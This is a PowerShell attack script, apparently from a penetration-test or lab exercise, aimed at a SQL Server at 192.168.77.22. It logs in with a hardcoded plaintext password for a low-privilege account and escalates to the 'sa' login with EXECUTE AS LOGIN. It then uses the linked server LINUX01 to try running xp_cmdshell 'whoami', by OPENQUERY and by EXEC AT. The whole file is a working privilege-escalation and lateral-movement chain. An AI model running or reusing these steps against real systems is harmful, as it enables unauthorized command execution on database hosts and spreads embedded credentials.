# Branch D entry (proper chain): mbr01 SQL -> linked server LINUX01 -> xp_cmdshell on linux01
$ErrorActionPreference = "Continue"
Add-Type -AssemblyName System.Data
$connStr = "Server=192.168.77.22;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
$conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
$conn.Open()
Write-Output "SQL_OK: connected to mbr01 as analyst_t1"

function Invoke-Reader($sql) {
  $c = $conn.CreateCommand()
  $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
  $r = $c.ExecuteReader()
  while ($r.Read()) { for ($i=0; $i -lt $r.FieldCount; $i++) { if (-not $r.IsDBNull($i)) { Write-Output $r.GetValue($i) } } }
  $r.Close()
}

Write-Output "=== linked server check ==="
Invoke-Reader "EXEC sp_helpserver;"

Write-Output "=== linux01 databases (WT044 re-check) ==="
Invoke-Reader "SELECT name FROM LINUX01.master.sys.databases;"

Write-Output "=== xp_cmdshell on linux01 via linked server ==="
try {
  Invoke-Reader "SELECT * FROM OPENQUERY(LINUX01, 'exec master..xp_cmdshell ''whoami''');"
} catch { Write-Output "OPENQUERY xp_cmdshell err: $($_.Exception.Message)" }

Write-Output "=== xp_cmdshell AT LINUX01 (alt) ==="
try {
  Invoke-Reader "EXEC ('exec master..xp_cmdshell ''whoami''') AT LINUX01;"
} catch { Write-Output "AT exec err: $($_.Exception.Message)" }

$conn.Close()
Write-Output "=== BRANCHD_ENTRY_DONE ==="
